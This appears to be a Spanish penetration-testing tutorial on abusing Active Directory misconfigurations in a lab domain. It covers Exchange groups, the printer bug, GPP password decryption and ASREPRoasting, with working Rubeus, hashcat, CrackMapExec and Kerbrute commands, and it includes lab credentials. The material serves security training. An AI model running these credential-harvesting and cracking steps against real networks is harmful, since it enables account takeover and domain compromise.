
# Malas configuraciones en AD

Existen muchos otros ataques y configuraciones erróneas interesantes que podemos encontrar durante una evaluación. Una comprensión amplia de los entresijos de AD nos ayudará a pensar de manera innovadora y a descubrir problemas que otros probablemente pasen por alto.

***

### Configuración del escenario

En esta sección, nos moveremos entre un host de ataque de Windows y Linux a medida que trabajamos con los distintos ejemplos. Puede generar los hosts para esta sección al final de esta sección y conectarse mediante RDP al host de ataque de Windows MS01. Para las partes de esta sección que requieren interacción de un host Linux, puede abrir una consola de PowerShell en MS01 y SSH con `172.16.5.225`las credenciales `htb-student:HTB_@cademy_stdnt!`.

***

## <mark style="color:purple;">Membresía de grupos relacionados con Exchange</mark>

Una instalación predeterminada de Microsoft Exchange dentro de un entorno AD (sin un modelo de administración dividida) abre muchos vectores de ataque, ya que a menudo se le otorgan a Exchange privilegios considerables dentro del dominio (a través de usuarios, grupos y listas de control de acceso). El grupo `Exchange Windows Permissions` no se incluye como un grupo protegido, pero a los miembros se les otorga la capacidad de escribir una DACL en el objeto de dominio. Esto se puede aprovechar para otorgarle a un usuario privilegios de DCSync.&#x20;

Un atacante puede agregar cuentas a este grupo aprovechando una configuración incorrecta de la DACL (posible) o aprovechando una cuenta comprometida que sea miembro del grupo Operadores de cuentas. Es común encontrar cuentas de usuario e incluso computadoras como miembros de este grupo. Los usuarios avanzados y el personal de soporte en oficinas remotas a menudo se agregan a este grupo, lo que les permite restablecer contraseñas. Este [repositorio de GitHub](https://github.com/gdedrouas/Exchange-AD-Privesc) detalla algunas técnicas para aprovechar Exchange para aumentar los privilegios en un entorno AD.

El grupo Exchange `Organization Management` es otro grupo extremadamente poderoso (en realidad, los "Administradores de dominio" de Exchange) y puede acceder a los buzones de correo de todos los usuarios del dominio. No es raro que los administradores de sistemas sean miembros de este grupo. Este grupo también tiene control total de la unidad organizativa denominada `Microsoft Exchange Security Groups`, que contiene el grupo `Exchange Windows Permissions`.

**Visualización de los permisos de gestión de la organización**

![imagen](https://academy.hackthebox.com/storage/modules/143/org_mgmt_perms.png)

Si podemos comprometer un servidor Exchange, esto a menudo conducirá a privilegios de administrador de dominio. Además, volcar credenciales en la memoria desde un servidor Exchange producirá decenas o cientos de credenciales de texto sin formato o hashes NTLM. Esto suele deberse a que los usuarios inician sesión en Outlook Web Access (OWA) y Exchange almacenan en caché sus credenciales en la memoria después de un inicio de sesión exitoso.

***

## <mark style="color:purple;">PrivExchange</mark>

El ataque `PrivExchange` es el resultado de una falla en la función `PushSubscription` en Exchange Server, que permite a cualquier usuario de dominio con un buzón forzar al servidor Exchange a autenticarse en cualquier host proporcionado por el cliente a través de HTTP.

El servicio Exchange se ejecuta como SYSTEM y tiene privilegios excesivos de forma predeterminada (es decir, tiene privilegios WriteDacl en el dominio anterior a la actualización acumulativa de 2019). Esta falla se puede aprovechar para retransmitir a LDAP y volcar la base de datos NTDS del dominio. Si no podemos retransmitir a LDAP, esto se puede aprovechar para retransmitir y autenticar a otros hosts dentro del dominio. Este ataque lo llevará directamente a Domain Admin con cualquier cuenta de usuario de dominio autenticada.

***

## <mark style="color:purple;">Error de impresora</mark>

El error de impresora es un fallo en el protocolo MS-RPRN (Print System Remote Protocol). Este protocolo define la comunicación del procesamiento de trabajos de impresión y la gestión del sistema de impresión entre un cliente y un servidor de impresión. Para aprovechar este fallo, cualquier usuario de dominio puede conectarse a la tubería con nombre del spool con el método `RpcOpenPrinter` y utilizar el método `RpcRemoteFindFirstPrinterChangeNotificationEx`, y forzar al servidor a autenticarse en cualquier host proporcionado por el cliente a través de SMB.

El servicio de cola de impresión se ejecuta como SYSTEM y se instala de forma predeterminada en los servidores Windows que ejecutan Desktop Experience. Este ataque se puede aprovechar para retransmitir a LDAP y otorgarle a su cuenta de atacante privilegios DCSync para recuperar todos los hashes de contraseñas de AD.

El ataque también se puede utilizar para retransmitir la autenticación LDAP y otorgar privilegios de delegación restringida basada en recursos (RBCD) para la víctima a una cuenta de computadora bajo nuestro control, lo que le otorga al atacante privilegios para autenticarse como cualquier usuario en la computadora de la víctima. Este ataque se puede aprovechar para comprometer un controlador de dominio en un dominio/bosque asociado, siempre que ya tenga acceso administrativo a un controlador de dominio en el primer bosque/dominio y la confianza permita la delegación TGT, que ya no es la opción predeterminada.

Podemos usar herramientas como el módulo `Get-SpoolStatus` de [esta](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) herramienta (que se puede encontrar en el objetivo generado) o [esta](https://github.com/NotMedic/NetNTLMtoSilverTicket) herramienta para verificar si hay máquinas vulnerables al [error de impresora MS-PRN](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability) . Esta falla se puede usar para comprometer un host en otro bosque que tenga habilitada la delegación sin restricciones, como un controlador de dominio. Puede ayudarnos a atacar a través de confianzas de bosque una vez que hayamos comprometido un bosque.

**Enumeración de errores de impresora MS-PRN**

```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

***

## <mark style="color:purple;">MS14-068</mark>

Se trataba de una falla en el protocolo Kerberos, que podía aprovecharse junto con las credenciales de usuario de dominio estándar para elevar los privilegios a Administrador de dominio. Un ticket de Kerberos contiene información sobre un usuario, incluido el nombre de cuenta, el ID y la membresía del grupo en el Certificado de atributo de privilegio (PAC). El PAC está firmado por el KDC utilizando claves secretas para validar que el PAC no haya sido alterado después de su creación.

La vulnerabilidad permitió que el KDC aceptara como legítimo un PAC falsificado. Esto se puede aprovechar para crear un PAC falso, presentando a un usuario como miembro de los administradores de dominio u otro grupo privilegiado. Se puede explotar con herramientas como Python [Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) o el kit de herramientas Impacket. La única defensa contra este ataque es la aplicación de parches. La máquina [Mantis](https://app.hackthebox.com/machines/98) en la plataforma Hack The Box muestra esta vulnerabilidad.

***

## <mark style="color:purple;">Detectar credenciales LDAP</mark>

Muchas aplicaciones e impresoras almacenan las credenciales LDAP en su consola de administración web para conectarse al dominio. Estas consolas suelen tener contraseñas débiles o predeterminadas. A veces, estas credenciales se pueden ver en texto sin formato. Otras veces, la aplicación tiene una función `test connection` que podemos usar para recopilar credenciales cambiando la dirección IP LDAP por la de nuestro host de ataque y configurando un receptor `netcat` en el puerto LDAP 389. Cuando el dispositivo intenta probar la conexión LDAP, enviará las credenciales a nuestra máquina, a menudo en texto sin formato. Las cuentas que se usan para las conexiones LDAP suelen tener privilegios, pero si no lo tienen, esto podría servir como punto de apoyo inicial en el dominio. Otras veces, se requiere un servidor LDAP completo para llevar a cabo este ataque, como se detalla en esta [publicación](https://grimhacker.com/2018/03/09/just-a-printer/) .

***

## <mark style="color:purple;">Enumeración de registros DNS</mark>

Podemos utilizar una herramienta como [adidnsdump](https://github.com/dirkjanm/adidnsdump) para enumerar todos los registros DNS de un dominio utilizando una cuenta de usuario de dominio válida. Esto resulta especialmente útil si la convención de nombres para los hosts que nos devuelven en nuestra enumeración utilizando herramientas como `BloodHound` es similar a `SRV01934.INLANEFREIGHT.LOCAL`. Si todos los servidores y estaciones de trabajo tienen un nombre poco descriptivo, nos resulta difícil saber qué atacar exactamente. Si podemos acceder a las entradas DNS en AD, podemos descubrir potencialmente registros DNS interesantes que apunten a este mismo servidor, como `JENKINS.INLANEFREIGHT.LOCAL`, que podemos utilizar para planificar mejor nuestros ataques.

La herramienta funciona porque, de forma predeterminada, todos los usuarios pueden enumerar los objetos secundarios de una zona DNS en un entorno de AD. De forma predeterminada, la consulta de registros DNS mediante LDAP no devuelve todos los resultados. Por lo tanto, al usar `adidnsdump`, podemos resolver todos los registros de la zona y, potencialmente, encontrar algo útil para nuestra interacción. Los antecedentes y una explicación más detallada de esta herramienta y técnica se pueden encontrar en esta [publicación](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/) .

En la primera ejecución de la herramienta, podemos ver que algunos registros están en blanco, a saber `?,LOGISTICS,?`:

**Usando adidnsdump**

```shell-session
afsh4ck@kali$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

**Visualización del contenido del archivo records.csv**

```shell-session
afsh4ck@kali$ head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

Si volvemos a ejecutar la herramienta con la flag `-r`, intentará resolver los registros desconocidos realizando una consulta `A`. Ahora podemos ver que `172.16.5.240` se ha mostrado una dirección IP para LOGISTICS. Si bien este es un pequeño ejemplo, vale la pena ejecutar esta herramienta en entornos más grandes. Podemos descubrir registros "ocultos" que pueden llevarnos a descubrir hosts interesantes.

**Uso de la opción -r para resolver registros desconocidos**

```shell-session
afsh4ck@kali$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

**Cómo encontrar registros ocultos en el archivo records.csv**

```shell-session
afsh4ck@kali$ head records.csv 

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

***

## <mark style="color:purple;">Otras configuraciones erróneas</mark>

Existen muchas otras configuraciones erróneas que pueden utilizarse para dificultar el acceso dentro de un dominio.

***

### Contraseña en el campo de descripción

En ocasiones, la información confidencial, como las contraseñas de las cuentas, se encuentra en los campos `descripción` o `notas` de la cuenta de usuario y se puede enumerar rápidamente mediante PowerView. En el caso de dominios grandes, resulta útil exportar estos datos a un archivo CSV para revisarlos sin conexión.

**Cómo encontrar contraseñas en el campo Descripción mediante Get-Domain User**

```powershell
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

***

### Campo PASSWD\_NOTREQD

Es posible encontrar cuentas de dominio con el campo [passwd\_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) configurado en el atributo userAccountControl. Si esto está configurado, el usuario no está sujeto a la longitud de la política de contraseñas actual, lo que significa que podría tener una contraseña más corta o ninguna contraseña (si se permiten contraseñas vacías en el dominio).&#x20;

Una contraseña se puede configurar en blanco intencionalmente (a veces, los administradores no quieren que se los llame fuera del horario laboral para restablecer las contraseñas de los usuarios) o presionar Enter accidentalmente antes de ingresar una contraseña al cambiarla a través de la línea de comandos. El hecho de que esta flag esté configurada en una cuenta no significa que no se haya configurado una contraseña, solo que es posible que no se requiera una.&#x20;

Hay muchas razones por las que esta flag puede configurarse en una cuenta de usuario, una de ellas es que un producto del proveedor configuró esta bandera en ciertas cuentas en el momento de la instalación y nunca eliminó la flag después de la instalación. Vale la pena enumerar las cuentas con esta flag configurada y probar cada una para ver si no se requiere contraseña (he visto esto un par de veces en las evaluaciones). Además, inclúyalo en el informe del cliente si el objetivo de la evaluación es ser lo más completa posible.

**Comprobación de la configuración PASSWD\_NOTREQD mediante Get-DomainUser**

```powershell
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

***

### Credenciales en recursos compartidos SMB y scripts SYSVOL

El recurso compartido `SYSVOL` puede ser un tesoro de datos, especialmente en organizaciones grandes. Podemos encontrar muchos scripts de lotes, VBScript y PowerShell diferentes dentro del directorio de scripts, que es legible por todos los usuarios autenticados en el dominio. Vale la pena buscar en este directorio las `contraseñas almacenadas` en los scripts. A veces encontraremos scripts muy antiguos que contienen cuentas deshabilitadas o contraseñas antiguas, pero de vez en cuando encontraremos oro, por lo que siempre debemos buscar en este directorio. Aquí podemos ver un script interesante llamado `reset_local_admin_pass.vbs`.

**Descubriendo un script interesante**

```powershell
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
```

Si observamos el script con más atención, veremos que contiene una contraseña para el administrador local integrado en los hosts de Windows. En este caso, valdría la pena comprobar si esta contraseña todavía está configurada en algún host del dominio. Podríamos hacerlo usando CrackMapExec y la flag `--local-auth` como se muestra en la sección de este módulo [`Password Spraying Interno - Desde Linux`](/ethical-hacking-cheatsheet/active-directory/active-directory/password-spraying/password-spraying-interno-desde-linux.md).

**Encontrando una contraseña en el script**

```powershell
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

***

### Group Policy Preferences (GPP) Passwords

Cuando se crea una nueva GPP, se crea un archivo .xml en el recurso compartido SYSVOL, que también se almacena en caché localmente en los puntos finales a los que se aplica la directiva de grupo. Estos archivos pueden incluir los que se utilizan para:

* `Mapa de unidades (drives.xml)`
* `Crear usuarios locales`
* `Crear archivos de configuración de impresora (printers.xml)`
* `Creación y actualización de servicios (services.xml)`
* `Creación de tareas programadas (scheduledtasks.xml)`
* `Cambiar las contraseñas de administrador local`

Estos archivos pueden contener una matriz de datos de configuración y contraseñas definidas. El valor `cpassword` del atributo está cifrado con AES de 256 bits, pero Microsoft [publicó la clave privada AES en MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) , que se puede utilizar para descifrar la contraseña. Cualquier usuario del dominio puede leer estos archivos, ya que están almacenados en el recurso compartido `SYSVOL` y todos los usuarios autenticados en un dominio, de forma predeterminada, tienen acceso de lectura a este recurso compartido del controlador de dominio. Esto se solucionó en 2014.&#x20;

[La vulnerabilidad MS14-025 en GPP podría permitir la elevación de privilegios](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30) para evitar que los administradores establezcan contraseñas mediante GPP. El parche no elimina los archivos Groups.xml existentes con contraseñas de SYSVOL. Si elimina la política GPP en lugar de desvincularla de la unidad organizativa, la copia almacenada en caché en la computadora local permanece.

El XML se parece al siguiente:

#### **Visualización de Groups.xml**

![imagen](https://academy.hackthebox.com/storage/modules/143/GPP.png)

Si recupera el valor de cpassword de forma más manual, la utilidad `gpp-decrypt` se puede utilizar para descifrar la contraseña de la siguiente manera:

#### **Descifrar la contraseña con gpp-decrypt**

```shell-session
afsh4ck@kali$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

Las contraseñas GPP se pueden localizar buscando o explorando manualmente el recurso compartido `SYSVOL` o utilizando herramientas como [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) , el módulo GPP Metasploit Post y otros scripts de Python/Ruby que localizarán el GPP y devolverán el valor cpassword descifrado.&#x20;

CrackMapExec también tiene dos módulos para localizar y recuperar contraseñas GPP. Un consejo rápido a tener en cuenta durante los compromisos: a menudo, las contraseñas GPP se definen para cuentas heredadas y, por lo tanto, puede recuperar y descifrar la contraseña de una cuenta bloqueada o eliminada.&#x20;

Sin embargo, vale la pena intentar pulverizar la contraseña internamente con esta contraseña (especialmente si es única). La reutilización de contraseñas está muy extendida y la contraseña GPP combinada con la pulverización de contraseñas podría resultar en un mayor acceso.

#### **Cómo localizar y recuperar contraseñas GPP con CrackMapExec**

```shell-session
afsh4ck@kali$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

También es posible encontrar contraseñas en archivos como `Registry.xml` cuando se configura el inicio de sesión automático a través de la Política de grupo. Esto se puede configurar por varias razones para que una máquina inicie sesión automáticamente al arrancar. Si esto se configura a través de la Política de grupo y no localmente en el host, entonces cualquier persona en el dominio puede recuperar las credenciales almacenadas en el archivo `Registry.xml` creado para este propósito.&#x20;

Este es un problema independiente de las contraseñas GPP, ya que Microsoft no ha tomado ninguna medida para bloquear el almacenamiento de estas credenciales en el SYSVOL en texto sin formato y, por lo tanto, son legibles por cualquier usuario autenticado en el dominio. Podemos buscar esto usando CrackMapExec con el módulo [gpp\_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) o usando el script [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) incluido en PowerSploit.

#### **Uso del módulo gpp\_autologin de CrackMapExec**

```shell-session
afsh4ck@kali$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

En el resultado anterior, podemos ver que hemos recuperado las credenciales para una cuenta llamada `guarddesk`. Es posible que esto se haya configurado para que las estaciones de trabajo compartidas que usan los guardias inicien sesión automáticamente en el arranque para dar cabida a varios usuarios durante el día y la noche que trabajan en diferentes turnos. En este caso, es probable que las credenciales sean de un administrador local, por lo que valdría la pena encontrar hosts en los que podamos iniciar sesión como administrador y buscar datos adicionales. A veces, podemos descubrir credenciales para un usuario con muchos privilegios o credenciales para una cuenta deshabilitada o una contraseña vencida que no nos sirve.

Un tema que abordamos a lo largo de este módulo es la reutilización de contraseñas. La mala higiene de contraseñas es común en muchas organizaciones, por lo que siempre que obtengamos credenciales, debemos verificar si podemos usarlas para acceder a otros hosts (como dominio o usuario local), aprovechar los derechos, como listas de control de acceso interesantes, recursos compartidos de acceso o usar la contraseña en un ataque password spraying para descubrir la reutilización de contraseñas y tal vez una cuenta que nos otorgue más acceso para nuestro objetivo.

***

### ASREPRoasting

Es posible obtener el Ticket Granting Ticket (TGT) para cualquier cuenta que tenga habilitada la configuración [No requerir autenticación previa de Kerberos](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) . Muchas guías de instalación de proveedores especifican que su cuenta de servicio debe configurarse de esta manera. La respuesta del servicio de autenticación (AS\_REP) está cifrada con la contraseña de la cuenta y cualquier usuario del dominio puede solicitarla.

Con la autenticación previa, el usuario introduce su contraseña, que cifra una marca de tiempo. El controlador de dominio la descifrará para validar que se utilizó la contraseña correcta. Si la autenticación es correcta, se emitirá un TGT al usuario para futuras solicitudes de autenticación en el dominio. Si una cuenta tiene la autenticación previa deshabilitada, un atacante puede solicitar datos de autenticación para la cuenta afectada y recuperar un TGT cifrado del controlador de dominio. Esto puede ser objeto de un ataque de contraseña offline mediante una herramienta como Hashcat o John the Ripper.

#### **Cómo visualizar una cuenta con la opción No requerir autenticación previa de Kerberos**

![imagen](https://academy.hackthebox.com/storage/modules/143/preauth_not_reqd_mmorgan.png)

ASREPRoasting es similar a Kerberoasting, pero implica atacar el AS-REP en lugar del TGS-REP. No se requiere un SPN. Esta configuración se puede enumerar con PowerView o herramientas integradas como el módulo AD de PowerShell.

El ataque en sí se puede realizar con el kit de herramientas [Rubeus](https://github.com/GhostPack/Rubeus) y otras herramientas para obtener el ticket de la cuenta de destino. Si un atacante tiene tiene permisos `GenericWrite` o `GenericAll` sobre una cuenta, puede habilitar este atributo y obtener el ticket AS-REP para realizar un descifrado sin conexión y recuperar la contraseña de la cuenta antes de deshabilitar el atributo nuevamente. Al igual que Kerberoasting, el éxito de este ataque depende de que la cuenta tenga una contraseña relativamente débil.

A continuación se muestra un ejemplo del ataque. Se puede utilizar PowerView para enumerar usuarios con su valor UAC establecido en `DONT_REQ_PREAUTH`.

#### **Enumeración del valor DONT\_REQ\_PREAUTH mediante Get-DomainUser**

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Con esta información en la mano, se puede aprovechar la herramienta Rubeus para recuperar el AS-REP en el formato adecuado para el descifrado de hash sin conexión. Este ataque no requiere ningún contexto de usuario de dominio y se puede realizar con solo conocer el nombre SAM del usuario sin autorización previa de Kerberos. Veremos un ejemplo de esto utilizando Kerbrute más adelante en esta sección. Recuerda agregar la flag `/nowrap` para que el ticket no esté envuelto en columnas (blob) y se recupere en un formato que podamos ingresar fácilmente en Hashcat.

#### **Recuperación de AS-REP en el formato adecuado mediante Rubeus**

```powershell
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
```

Luego podemos descifrar el hash sin conexión usando Hashcat con el modo `18200`.

#### **Descifrando el hash offline con Hashcat**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10506240/14344385 (73.24%)
Rejected.........: 0/10506240 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: WellHelloNow -> W14233LTKM

Started: Fri Apr  1 13:18:37 2022
Stopped: Fri Apr  1 13:18:55 2022
```

{% endcode %}

Al realizar la enumeración de usuarios con `Kerbrute`, la herramienta recuperará automáticamente el AS-REP de cualquier usuario encontrado que no requiera autenticación previa de Kerberos.

#### **Recuperación del AS-REP mediante Kerbrute**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >  	172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
